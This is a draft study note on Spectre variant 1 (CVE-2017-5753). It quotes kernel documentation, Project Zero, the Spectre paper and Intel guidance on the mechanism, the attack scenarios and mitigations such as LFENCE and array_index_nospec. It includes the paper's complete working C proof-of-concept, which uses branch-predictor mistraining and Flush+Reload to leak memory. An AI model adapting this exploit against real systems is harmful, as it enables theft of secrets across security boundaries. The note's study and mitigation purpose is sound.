---
title: 【Security】Spectre-V1
emoji: "🛡️"
type: "idea"
topics: ["security"]
published: false
---

# General Information

- CVE ID: CVE-2017-5753
- Disclosure Date: January 8th, 2018
- a.k.a: Spectre variant 1, Variant 1, Bounds Check Bypass, Spectre-BCB

# How It Works

https://docs.kernel.org/admin-guide/hw-vuln/spectre.html#spectre-variant-1-bounds-check-bypass

> The bounds check bypass attack takes advantage of speculative execution that bypasses conditional branch instructions used for memory access bounds check (e.g. checking if the index of an array results in memory access within a valid range). This results in memory accesses to invalid memory (with out-of-bound index) that are done speculatively before validation checks resolve. Such speculative memory accesses can leave side effects, creating side channel which leak information to the attacker.

> Note that, despite "Bounds Check Bypass" name, Spectre variant 1 is not only about user-controlled array bounds checks. It can affect any conditional checks. The kernel entry code interrupt, exception, and NMI handlers all have conditional swapgs checks. Those may be problematic in the context of Spectre v1, as kernel code can speculatively run with a user GS.

https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html

> Consider the code sample below. If `arr1->length` is uncached, the processor can speculatively load data from `arr1->data[untrusted_offset_from_caller]`. This is an out-of-bounds read. That should not matter because the processor will effectively roll back the exeuction state when the branch has executed; none of the speculatively executed instruction will retire (e.g. acuse registers etc. to be affected).
>
> ```c
> struct array {
>     unsigned long length;
>     unsigned char data[];
> };
> struct array *arr1 = ...;
> unsigned long untrusted_offset_from_caller = ...;
> if (untrusted_offset_from_caller < arr1->length) {
>     unsigned char value = arr1->data[untrusted_offset_from_caller];
>     ...
> }
> ```
>
> However, in the following code sample, there's an issue. If `arr1->length`, `arr2->data[0x200]` and `arr2->data[0x300]` are not cached, but all other accessed data is, and the branch conditions are predicted as true, the processor can do the following speculatively before `arr1->length` has been loaded and the execution is re-steered:
> - load `value = arr1->data[untrusted_offset_from_caller]`
> - start a load from a data-dependent offset in `arr1->data`, loading the corresponding cache line into the L1 cache
>
> ```c
> struct array {
>     unsigned long length;
>     unsigned char data[];
> };
> struct array *arr1 = ...; /* small array */
> struct array *arr2 = ...; /* array of size 0x400 */
> /* >0x400 (OUT OF BOUNDS!) */
> unsigned long untrusted_offset_from_caller = ...;
> if (untrusted_offset_from_caller < arr1->length) {
>     unsigned char value = arr1->data[untrusted_offset_from_caller];
>     unsigned long index2 = ((value & 1) * 0x100) + 0x200;
>     if (index2 < arr2->length) {
>         unsigned char value2 = arr2->data[index2];
>     }
> }
> ```
>
> After the execution has been returned to the non-speculative path because the processor has noticed that `untrusted_offset_from_caller` is bigger than `arr1->length`, the cache line containing `arr2->data[index2]` stays in the L1 cache. By measuring the time required to load `arr2->data[0x200]` and `arr2->data[0x300]`, an attacker can then determine whether the value of `index2` during speculative execution was `0x200` or `0x300` - which discloses whether `arr1->data[untrusted_offset_from_caller] & 1` is 0 or 1.
>
> To be able to actually use this behavior for an attack, an attacker needs to be able to cause the execution of such a vulenerable code pattern in the targeted context with an out-of-bounds index. For this, the vulnerable code pattern must either be present in existing code, or there must be an interpreter or JIT engine that can be used to generate the vulnerable code pattern. So far, we have not actually identified any existing, exploitable instances of the vulnerable code pattern; the PoC for leaking kernel memory using variant 1 uses the eBPF interpreter or the eBPF JIT engine, which are built into the kernel and accessible to normal users.

https://spectreattack.com/spectre.pdf

> Variant 1: Exploiting Conditional Branches. In this variant of Spectre attacks, the attacker mistrains the CPU's branch predictor into mispredicting the direction of a branch, causing the CPU to temporarily violate program semantics by executing code that would not have been executed otherwise. As we show, this incorrect speculative execution allows an attacker to read secret information stored in the program's address space.
> Indeed, consider the following code example:
> ```c
> if (x < array1_size)
>     y = array1[array1[x] * 4096];
> ```
> In the example above, assume that the variable `x` contains attacker-controlled data. To ensure the validity of the memory access to `array1`, the above code contains an `if` statement whose purpose is to verify that the value of `x` is within a legal range. We show how an attacker can bypass this `if` statement, thereby reading potentially secret data from the process's address space.
>
> First, during an initial mistraining phase, the attacker invokes the above code with valid inputs, thereby training the branch predictor to expect that the `if` will be true. Next, during the exploit phrase, the attacker invokes the code with a value of `x` outside the bounds of `array1`. Rather than waiting for determination of the branch result, the CPU guesses that the bounds check will be true and already speculatively executes instructions that evaluate `array2[array1[x] * 4096]` using the malicious `x`. Note that the read from `array2` loads data into the cache at an address that is dependent on `array1[x]` using the malicious `x`, scaled so that accesses go to different cache lines and to avoid hardware prefetching effects.
>
> When the result of the bounds check is eventually determined, the CPU discovers its error and reverts any changes made to its nominal microarchitectural state. However, changes made to the cache state are not reverted, so the attacker can analyze the cache contents and find the value of the potentially secret byte retrieved in the out-of-bounds read from the victim's memory.

> In most cases, the attack begins with a setup phase, where the adversary performs operations that mistrain the processor so that it will later make an exploitably erroneous speculative prediction. In addition, the setup phase usually includes steps that help induce speculative execution, such as manipulating the cache state to remove data that the processor will need to determine the actual control flow. During the setup phase, the adversary can also prepare the covert channel that will be used for extracting the victim's information, e.g., by performing the flush or evict part of a Flush+Reload or Evict+Reload attack.
>
> During the second phase, the processor speculatively executes instruction(s) that transfer confidential information from the victim context into a microarchitectural covert channel. This may be triggered by having the attacker request that the victim perform an action, e.g., via a system call, a socket, or a file. In other cases, the attacker may leverage the speculative (mis-)execution of its own code to obtain sensitive information from the same process. For example, attack code which is sandboxed by an interpretter, just-in-time compiler, or 'safe' language may wish to read memory it is not supposed to access. While speculative execution can potentially expose sensitive data via a broad range of covert channels, the examples given cause speculative execution to first read a memory value at an attakcer-chosen address then perform a memory operation that modifies the cache state in a way that exposes the value.
>
> For the final phase, the sensitive data is recovered. For Spectre attacks using Flush+Reload or Evict+Reload, the recovery process consists of timing the access to memory addresses in the cache lines being monitored.

> IV. VARIANT 1: EXPLOITING CONDITIONAL BRANCH MISPREDICTION
>
> In this section, we demonstrate how conditional branch misprediction can be exploited by an attacker to read arbitrary memory from another context, e.g., another process.
>
> Consider the case where the code in Listing 1 is a part of a function (e.g., a system call or a library) receiving an unsigned integer `x` from an untrusted source. The process running the code has access to an array of unsigned bytes `array1` of size `array1_size`, and a second byte array `array2` of size 1 MB.
>
> ```c
> if (x < array1_size)
>     y = array2[array1[x] * 4096];
> ```
> Listing 1: Conditional Branch Example
>
> The code fragment begins with a bounds check on `x` which is essential for security. In particular, this check prevents the processor from reading sensitive memory outside of `array1`. Otherwise, an out-of-bounds input `x` could trigger an exception or could cause the processor to access sensitive memory by supplying `x = (address of a secret byte to read) - (base address of array1)`.
>
> Figure 1 illustrates the four cases of the bounds check in combination with speculative execution. Before the result of the bounds check is known, the CPU speculatively executes code following the condition by predicting the most likely outcome of the comparison. There are many reasons why the result of a bounds check may not be immediately known, e.g., a cache miss preceding or during the bounds check, congestion of an execution unit required for the bounds check, complex arithmetic dependencies, or nested speculative execution. However, as illustrated, a correct prediciton of the condition in these cases leads to faster overall execution.
>
> ```
>                     /------------------\
>                     |  if <in bounds>  |
>                     \------------------/
>                true |                  | false
>           +---------|------------------|----------+
> predicted |      +--+--+            +--+--+       |
>           | true |     | false true |     | false |
>           +------|-----|------------|-----|-------+
>                  V     V            V     V
>                fast   slow         !!!   fast
> ```
> Fig. 1: Before the correct outcome of the bounds check is known, the branch predictor continues with the most likely branch target, leading to an overall execution speed-up if the outcome was correctly predicted. However, if the bounds check is incorrectly predicted as true, an attacker can leak secret information in certain scenarios.
>
> Unfortunately, during speculative execution, the conditional branch for the bounds check can follow the incorrect path. In this example, suppose an adversary causes the code to run such that:
> - the value of `x` is maliciously chosen (out-of-bounds), such that `array1[x]` resolves to a secret byte `k` somewhere in the victim's memory;
> - `array1_size` and `array2` are uncached, but `k` is cached; and
> - previous operations received values of `x` that we valid, leading the branch predictor to assume the `if` will likely be true.
>
> This cache configuration can occur naturally or can be created by an adversary, e.g., by causing eviction of `array1_size` and `array2` then having the kernel use the secret key in a legitimate operation.
>
> When the compiled code above runs, the processor begins by comparing the malicious value of `x` against `array1_size`. Reading `array1_size` results in a cache miss, the processor faces a substantial delay until its value is available from DRAM. Especially if the branch condition, or an instruction somewhere before the branch, waits for an argument that is uncached, it may take some time until the branch result is determined. In the meantime, the branch predictor assumes the `if` will be true. Consequently, the speculative execution logic adds `x` to the abse address of `array1` and requests the data at the resulting address from the memory subsystem. This read is a cache hit, and quickly returns the value of the secret byte `k`. The speculative execution logic then uses `k` to compute the address of `array2[k * 4096]`. It then sends a request to read this address from memory (resulting in a cache miss). While the read from `array2` is already in flight, the branch result may finally be determined. The processor realizes that its speculative execution was erroneous and rewinds its register state. However, the speculative read from `array2` affects the cache state in an address-specific manner, where the address depends on `k`.
>
> To complete the attack, the adversary measures which location in `array2` was brought into the cache, e.g., via Flush+Reload or Prime+Probe. This reveals the value of `k`, since the victim's speculative execution cached `array2[k * 4096]`. Alternatively, the adversary can also use Evict+Time, i.e., immediatelly call the target function again with an in-bounds value `x'` and measure how long this second call takes. If `array1[x']` equals `k`, then the location accessed in `array2` is in the cache, and the operation tends to be faster.

> APPENDIX C: SPECTRE EXAMPLE IMPLEMENTATION
>
> In Listing 5, if the compiled instructions in `victim_function()` were exeucted in strict program order, the function would only read from `array1[0..15]` since `array1_size = 16`. Yet, when executed speculatively, out-of-bounds reads occur and leak the secret string.
>
> The `read_memory_byte()` function makes several training calls to `victim_function()` to make the branch predictor expect valid values for `x`, then calls with an out-of-bounds `x`. The conditional branch mispredicts and the ensuing speculative execution reads a secret byte using the out-of-bounds `x`. The speculative code then reads from `array2[array1[x] * 4096]`, leaking the value of `array1[x]` into the cache state.
>
> To complete the attack, the code uses a simple Flush+Reload sequence to identify which cache line in `array2` was loaded, revealing the memory contents. The attack is repeated several times, so even if the target byte was initially uncached, the first iteration will bring it into the cache. This unoptimized implementation can read around 10 KB/s on an i7-4650U.

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/*******************************************************************************
Victim code
*******************************************************************************/
unsigned int array1_size = 16;
uint8_t unsued1[64];
uint8_t array1[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* To not optimize out victim_function() */

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

/*******************************************************************************
Analysis code
*******************************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2],
                    int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--) {
        /* Flush array2[(0..255) * 512] from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]); /* clflush */

        /* 5 trainings (x = training_x) per attack run (x = malicious_x) */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++) {
            } /* Delay (can also mfence) */

            /* Bit twiddling to set x = traingin_x if j % 6 != 0
             * else x = malicious_x */
            /* Avoid jumps in case those tip off the branch predictor */
            /* Set x = FFFFFFFFFFFF0000 if j % 6 == 0, else x = 0 */
            x = ((j % 6) - 1) & ~0xFFFF;
            /* Set x = -1 (0xFFFFFFFFFFFFFFFF) if j % 6 == 0, else x = 0 */
            x = (x | (x >> 16));
            /*
             * if x == 0, x = training_x & 0x0
             *              = training_x
             * if x == -1, x = training_x ^ (malicious_x ^ training_x)
             *               = malicious_x
             */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            victim_function(x);
        }

        /* Time reads. Mixed-up order to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);
            junk = *addr;                    /* Time memory access */
            time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
            if (time2 <= CACHE_HIT_THRESHOLD &&
                mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit -> score +1 for this value */
        }

        /* Locate highest & second-highest results */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }

        /* Success if best is >= 2 * runner-up + 5 or 2/0 */
        if (results[j] >= (2 * results[k] + 5) ||
            (results[j] == 2 && results[k] == 0))
            break;
    }
    /* use junk to prevent code from being optimized out */
    results[0] ^= junk;
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv) {
    size_t malicious_x =
        (size_t)(secret - (char *)array1); /* default for malicious_x */
    int i, score[2], len = 40;
    uint8_t value[2];
    char *buf, c;

    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 to ensure it is memory backed */
    if (argc == 3) {
        sscanf(argv[1], "%p", (void **)(&malicious_x));
        malicious_x -= (size_t)array1; /* input value to pointer */
        scanf(argv[2], "%d", &len);
    }
    buf = malloc(len * sizeof(char));

    printf("Reading %d bytes:\n", len);
    for (i = 0; i < len; ++i) {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);

        readMemoryByte(malicious_x++, value, score);

        printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
        c = value[0] > 31 && value[0] < 127 ? value[0] : '?';
        buf[i] = c;
        printf("0x%02X='%c' score=%d", value[0], c, score[0]);
        if (score[1] > 0)
            printf("    (second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");
    }
    printf("Original : %s\n", secret);
    printf("Recovered: %s\n", buf);
    return (0);
}
```

https://www.fortinet.com/blog/threat-research/into-the-implementation-of-spectre

> `rdtscp` (used to read the time stamp counter) is typically only available on newer CPUs. `rdtsc` is more common but non-serializing, meaning that the CPU may re-order it, and consequently for timing attacks it is used along with a serializing instruction such as `cpuid`.

> The `array1` is surrounded by two unused arrays: those are useful to ensure we hit different cache lines. On many processors, the L1 cache has 64 bytes per line.

> Have you noticed that the paper mentions `k * 256`, where `k` is `array1[x]` (i.e. `array1[x] * 256`) while we have in the code `array1[x] * 512`? The multiplication factor needs to be the size of a cache line. Presumably, at the time of implementation, the authors realized that for most Intel processors this was, as we said earlier, 64 bytes per line, i.e. `64 * 8 = 512`. This value is prcessor dependent.

> First, to start in a clear state, we flush the entire `array2` table. This table is shared with the attacker, and it needs to be able to store 256 different cache lines. Remember, a cache line size is 512 bits.

> As the comment says, we are not simply measuring time to access each byte in a sequence, but mixing them so that the processor cannot guess which byte it will access next and then optimize accesses.

# Attack Scenarios

https://docs.kernel.org/admin-guide/hw-vuln/spectre.html

> 1. A user process attacking the kernel.
>
> Spectre variant 1
>
> The attacker passes a parameter to the kernel via a register or via a known address in memory during a syscall. Such parameter may be used later by the kernel as an index to an array or to derive a pointer for Spectre variant 1 attack. The index or pointer is invalid, but bound checks are bypassed in the code branch taken for speculative execution. This could cause privileged memory to be accessed and leaked.
>
> For kernel code that has been identified where data pointers could potentially be influenced for Spectre attacks, new "nospec" accessor macros are used to prevent speculative loading data.

> 2. A user process attacking another user process.
>
> A malicious user process can try to attack another user process, either via a context switch on the same hardware thread, or from the sibling hyperthread sharing a physical processor core on simultaneous multi-threading (SMT) system.
>
> Spectre variant 1 attacks generally require passing parameters between the processes, which needs a data passing relationship, such as remote procedure call (RPC). Those parameters are used in gadget code to derive invalid data pointers accessing privileged memory in the attacked process.

> 3. A virtualized guest attacking the host
>
> The attack mechanism is similar to how user processes attack the kernel. The kernel is entered via hyper-calls or other virtualization exit paths.
>
> For Spectre variant 1 attacks, rogue guests can pass parameters (e.g. in registers) via hyper-calls to derive invalid pointers to speculate into privileged memory after entering the kernel. For places where such kernelc ode has been identified, nospec accessor macros are used to stop speculative memory access.

> 4. A virtualized guest attacking other guest
>
> A rogue guest may attack another guest to get data accessible by the other guest.
>
> Spectre variant 1 attacks are possible if parameters can be passed between guests. This may be done via mechanisms such as shared memory or message passing. Such parameters could beused to derive data pointers to privileged data in guest. The privileged data could be accessed by gadget code in the victim's speculation paths.

# Mitigations

https://spectreattack.com/spectre.pdf

> VII. MITIGAITON OPTIONS
>
> Several countermeasures for Spectre attacks have been proposed. Each addresses one or more of the features that the attack replies upon. We now discuss these countermeasures and their applicability, effectiveness, and cost.
>
> A. Preventing Speculative Execution
>
> Speculative exeuction is required for Spectre attacks. Ensuring that instructions are executed only when the control flow leading to them is ascertained would prevent speculative execution and, with it, Spectre attacks. While effective as a countermeasure, preventing speculative execution would cause a significant degradation in the performance of the processor.
>
> Although current processors do not appear to have methods that allow software to disable speculative execution, such modes could be added in future processors, or in some cases could potentially be introduced via mircocode changes. Alternatively, some hardware products (such as embedded systems) could switch to alternate processor models that do not implement speculative execution. Still, this solution is unlikely to provide an immediate fix to the problem.
>
> Alternatively, the software could be modified to use *serializing* or *speculation block* instructions that ensure instructions following them are not executed speculatively. Intel and AMD recommend the use of the `lfence` instruction. The safest (but slowest) approach to protect conditional branches would be to add such instruction on the two outcomes of every conditional branch. However, this amounts to disabling branch prediction and our tests indicate that this would dramatically reduce performance. An improved approach is to use static analysis to reduce the number of speculation blocking instructions required, since many code paths do not have the potential to read and leak out-of-bounds memory. In contrast, Microsoft's C compiler MSVC takes an approach of defaulting to unprotected code unless the static analyzer detects a known-bad code pattern, but as a result misses many vulnerable code pattern.

> The approach requires that all potentially vulnerable software is instrumented. Hence, for protection, updated software binaries and libraries are required. This could be an issue for legacy software.

> B. Preventing Access ot Secret Data
>
> Other countermeasures can prevent speculatively executed code from accessing secret data. One such measure, used by the Google Chrome web browser, is to execute each web site in a separate process. Because Spectre attacks only leverage the victim's permissions, an attack such as the one we performed using JavaScript would not be able to access data from the processes assigned to other websites.
>
> WebKit employs two strategies for limiting access to secret data by speculatively executed code. The first strategy replaces array bounds checking with index masking. Instead of checking that an array index is within the bounds of the array, WebKit applies a bit mask to the index, ensuring that it is not much bigger than the array size. While masking may result in access outside the bounds of the array, this limits the distance of the bounds violation, preventing the attacker from accessing arbitrary memory.
>
> The second strategy protects access to pointers by xoring them with a pseudo-random *poison* value. The poison protects the pointers in two distinct ways. First, an adversary who does not know the poison value cannot use a poisoned pointer (although various cache attacks could leak the poison value). More significantly, the poison value ensures that mispredictions on the branch instructions used for type checks will result in pointers associated with type being used for another type.
>
> These approaches are most useful for just-in-time (JIT) compilers, interpreters, and other language-based protections, where the runtime environment has control over the executed code and wishes to restrict the data that a program may access.

> C. Preventing Data from Entering Covert Channels
>
> Future processors could potentially track whether data was fetched as the result of a speculative operation and, if so, prevent that data from being used in subsequent operations that might leak it. Current processors do not generally have this capability, however.

> D. Limiting Data Extraction from Covert Channels
>
> To exfiltrate information from transient instructions, Spectre attacks use a covert communication channel. Multiple approaches have been suggested for mitigating such channels. As an attempted mitigation for our JavaScript-based attack, major browser providers have further degraded the resolution of the JavaScript timer, potentially adding jitter. These patches also disable SharedArrayBuffers, which can be used to create a timing source.
>
> While this countermeasure would necessitate additional averaging for attacks such as the one in Section IV-C, the level of protection it provides is unclear since error sources simply reduce the rate at which attackers can exfiltrate data. Furthermore, as [18] show, current processors lack the mechanisms required for complete covert channel elimination. Hence, while this approach may decrease attack performance, it does not guarantee that attacks are not possible.

https://docs.kernel.org/admin-guide/hw-vuln/spectre.html

> Spectre system information
>
> The Linux kernel provides a sysfs interface to enumerate the current mitigation status of the system for Spectre: whether the system is vulnerable, and which mitigations are active.
>
> The sysfs file showing Spectre variant 1 mitigation status is: `/sys/devices/system/cpu/vulnerabilities/spectre_v1`
>
> The possible values in this file are:
> - 'Not affected': The processor is not vulnerable.
> - 'Vulnerable: __user pointer sanitization and usercopy barriers only; no swapgs barriers': The swapgs protections are disabled; otherwise it has protection in the kernel on case by case base with explicit pointer sanitization and usercopy LFENCE barriers.
> - 'Mitigation: usercopy/swapgs barriers and __user pointer sanitization': Protection in the kernel on a case by case base with explicit pointer sanitization, usercopy LFENCE barriers, and swapgs LFENCE barriers.
>
> However, the protections are put in place on a case by case basis, and there is no guarantee that all possible attack vectors for Spectre variant 1 are covered.

> Turning on mitigation for Spectre variant 1 and Spectre variant 2
>
> 1. Kernel mitigation
>
> Spectre variant 1
>
> For the Spectre variant 1, vulnerable kernel code (as determined by code audit or scanning tools) is annotated on a case by case basis to use nospec accessor macros for bounds clipping to avoid any usable disclosure gadgets. However, it may not cover all attack vectros for Spectre variant 1.
>
> Copy-from-user code has an LFENCE barrier to prevent the `access_ok()` check from being mis-speculated. The barrier is done by the `barrier_nospec()` marco.

> 2. User program mitigation
>
> User programs can mitigate Spectre variant 1 using LFENCE or "bounds clipping".

> 3. VM mitigation
>
> Within the kernel, Spectre variant 1 attacks from rogue guests are mitigated on a case by case basis in VM exit paths. Vulnerable code uses nospec accessor macros for "bounds clipping", to avoid any usable disclosure gadgets. However, this may not cover all variant 1 attack vectors.

https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/analyzing-bounds-check-bypass-vulnerabilities.html

> LFENCE
>
> The main mitigation for bounds check bypass is through use of the `LFENCE` instruction. The `LFENCE` isntruction does not execute until all prior instructions have completed locally, and no later instruction begins executio until `LFENCE` completes. Most vulnerabilities identified in the Identifying vulnerabilities section can be protected by inserting an `LFENCE` instruction; for example:
>
> ```
> if (user_value >= LIMIT)
>     return ERROR;
> lfence();
> x = table[user_value];
> node = entry[x]
> ```
>
> Where `lfence()` is a compiler intrinsic or assembler inline that issues an `LFENCE` instruction and also tells the compiler that memory references may not be moved across the boundary. The `LFENCE` ensures that the loads do not occur until the condition has actually been checked. The memory barrier prevents the compiler from reordering references around the `LFENCE`, and thus breaking the protection.
>
> Placement of LFENCE
>
> To protect against speculative timing attacks, place the `LFENCE` instruction after the range check and branch, but before any code that consumes the checked value, and before the data can be used in a gadget that might allow measurement.
>
> For example:
>
> ```
> if (x > sizeof(table))
>     return ERROR;
> lfence();
> if (a[x].op == OP_VECTOR)
>     avx_operation(a[x]);
> else
>     integer_operation(a[x]);
> ```
>
> Unless there are specific reasons otherwise, and the code has been carefully analyzed, Intel recommends that the `LFENCE` is always placed after the range check and before the range checked value is consumed by other code, particularly if the code involves conditional branches.
>
> Bounds Clipping
>
> Other instructions such as `CMOVcc`, `AND`, `ADC`, `SBB` and `SETcc` can also be used to help prevent bounds check bypass by constraining speculative execution on current family 6 processors (Intel Core, Intel Atom, Intel Xeon and Intel Xeon Phi processors). However, these instructions may not be guaranteed to do so on future Intel processors. Intel intends to release further guidance on the usage of instructions to constrain speculation in the future before processors with different behavior are released.
>
> Memory disambiguiation described in the Speculative Execution Side Channel Mitigations technical paper can theoretically impact such speculation constraining sequences when they involve a load from memory.
>
> This approach can avoid stalling the pipeline as `LFENCE` does.
>
> At the simplest:
>
> ```
> unsigned int user_value;
> if (user_value > 255)
>     return ERROR;
> x = table[user_value];
> ```
>
> Can be made safe by instead using the following logic:
>
> ```
> volatile unsigned int user_value;
> if (user_value > 255)
>     return ERROR;
> x = table[user_value & 255];
> ```
>
> This works for powers of two array lengths or bounds only. In the example above the table array length is 256 (2^8), and the valid index should be <= 255. Take care that the compiler used does not optimize away the `& 255` operation. For other ranges, it's possible to use `CMOVcc`, `ADC`, `SBB`, `SETcc` and similar instructions to do verification.
>
> Although this mitigation approach can be faster than other approaches it is not guaranteed for the future. Developer who cannot control which CPUs their software will run on (such as general application, library, and SDK developers) should not use this mitigation technique. Intel intends to release further guidance on how to use serializing instructions to constrain speculation before future processors with different behavior are released.
>
> Both of these techniques can be applied to function call tables, while the `LFENCE` approach is generally the only technique that can be used when typecasting.
>
> Multiple Branches
>
> When using mitigations, particularly the bounds clipping mitigations, it is important to remember that the processor will speculate through multiple branches. Thus, the following code is not safe:
>
> ```
> int *key;
> int valid = 0;
>
> if (input < NUM_ENTRIES) {
>     lfence();
>     key = &table[input];
>     valid = 1;
> }
> ....
> if (valid)
>     *key = data;
> ```
>
> In this example, although the mitigaiton is applied correctly when the processor speculates that the first condition is valid, no protection is applied if the processor takes the out-of-range value and then speculates that `valid` is true on the other path. In this case it will probably expose the contents of a random register, although not in an easy to measure fashion.
>
> Preinitializing key to `NULL` or another safe address will also not reliably work, as the compiler can elimite the `NULL` assignment because it can never be used non-speculatively. In such cases it may be more appropriate to merge the two conditional code sections and put the code between them into a separate function that is called on both paths. Or you could add `volatile` to `key` and assign it to `NULL`-forcing the assignment to occur with `volatile`, or to add `LFENCE` before the final assignment.


> Linux kernel
>
> The current Linux kernel mitigation approach to bounds check bypass is described in speculation.rst file in the Linux kernel documentation. This file is subject to change as delovelopers and multiple processor vendors determine their preferred approaches.
>
> `ifence()`: on x86 architecture, this issues an `LFENCE` and provides the compiler with the needed memory barriers to perform the mitigation. It can be used as `lfence()`, as in the examples above. On non-Intel processors, `ifence()` either generates the correct barrier code for that processor, or does nothing if the processor does not speculate.
>
> `array_ptr(array, index, max)`: this is an inline that, irrespective of the processor, provides a method to safely dereference an array element. Additionally, it returns `NULL` if the lookup is invalid. This allows you to take the many cases where you range check and then check that an entry is present, and fold those cases into a single conditional test.
>
> Thus we can turn:
>
> ```
> if (handle < 32) {
>     x = handle_table[handle];
>     if (x) {
>         function(x);
>         return 0;
>     }
> }
> return -EINVAL;
> ```
>
> Into:
>
> ```
> x = array_ptr(handle_table, handle, 32);
> if (x == NULL)
>     return -EINVAL;
> function(*x);
> return 0;
> ```

https://docs.kernel.org/staging/speculation.html

> Mitigating speculation side-channels
>
> The kernel provides a generic API to ensure that bounds checks are respected even under speculation. Architectures which are affected by speculation-based side-channels are expected to implement these primitives.
>
> The `array_index_nospec()` helper in `<linux/nospec.h>` can be used to prevent information from being leaked via side-channels.
>
> A call to `array_index_nospec(index, size)` returns  asanitized index value that is bounded to `[0, size)` even under cpu speculation conditions.
>
> This can be used to protect the earlier `load_array()` example:
> ```
> int load_array(int *array, unsigned int index)
> {
>     if (index >= MAX_ARRAY_ELEMTS)
>         return 0;
>     else {
>         index = array_index_nospec(index, MAX_ARRAY_ELEMS);
>         return array[index];
>     }
> }
> ```


# References
- [Spectre (security vulnerability) - Wikipedia](https://en.wikipedia.org/wiki/Spectre_(security_vulnerability))
- [NVD - cve-2017-5753](https://nvd.nist.gov/vuln/detail/cve-2017-5753)
- [CVE-2017-5753 : Systems with microprocessors utilizing speculative execution and branch prediction may allow unauthorized disclosure of](https://www.cvedetails.com/cve/CVE-2017-5753/)
- [Spectre Attacks: Exploiting Speculative Execution](https://spectreattack.com/spectre.pdf)
- [Project Zero: Reading privileged memory with a side-channel](https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html)
- [Meltdown and Spectre](https://meltdownattack.com/)
- [Spectre Side Channels — The Linux Kernel documentation](https://docs.kernel.org/admin-guide/hw-vuln/spectre.html)
- [Into the Implementation of Spectre](https://www.fortinet.com/blog/threat-research/into-the-implementation-of-spectre)
- [crozone/SpectrePoC: Proof of concept code for the Spectre CPU exploit.](https://github.com/crozone/SpectrePoC)
- [Meltdown and Spectre - Jon Masters, Computer Architect, Red Hat, Inc. - Usenix LISA 2018](https://www.usenix.org/sites/default/files/conference/protected-files/lisa18_slides_masters.pdf)
- [Spectre(v1/v2/v4) V.S. Meltdown(v3) - Gavin Guo - Engineering Technical Lead](https://events19.linuxfoundation.cn/wp-content/uploads/2017/11/Understanding-Spectre-v2-and-How-the-Vulnerability-Impact-the-Cloud-Security_Gavin-Guo.pdf)
- [An Analysis of Speculative Type Confusion Vulnerabilities in the Wild | USENIX](https://www.usenix.org/conference/usenixsecurity21/presentation/kirzner)
- [Google Online Security Blog: A Spectre proof-of-concept for a Spectre-proof web](https://security.googleblog.com/2021/03/a-spectre-proof-of-concept-for-spectre.html)
- [Bounds Check Bypass / CVE-2017-5753 / INTEL-SA-00088](https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/bounds-check-bypass.html)
- [Analyzing Potential Bounds Check Bypass Vulnerabilities](https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/analyzing-bounds-check-bypass-vulnerabilities.html)
- [Speculation — The Linux Kernel documentation](https://docs.kernel.org/staging/speculation.html)
- [[PATCH v6 00/13] spectre variant1 mitigations for tip/x86/pti](https://lore.kernel.org/all/151727420158.33451.11658324346540434635.stgit@dwillia2-desk3.amr.corp.intel.com/T/#m06e270f50a0421cbb18c54dd806cf08d0662a1d1)
- [[PATCH 0/9] Mitigations against spectre-v1 in the arm64 Linux kernel - Will Deacon](https://lore.kernel.org/all/1517844864-15887-1-git-send-email-will.deacon@arm.com/)
- [The kernel’s command-line parameters — The Linux Kernel documentation](https://docs.kernel.org/admin-guide/kernel-parameters.html)
